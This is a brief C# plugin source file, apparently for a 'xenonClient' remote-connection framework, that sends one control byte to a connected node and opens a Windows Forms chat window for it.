using Chat;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using xenonClient;


namespace Plugin
{
    public class Main
    {
        public async Task Run(Node node) 
        {
            await node.SendAsync(new byte[] { 3 });
            Application.Run(new ChatForm(node));
        }
    }
}
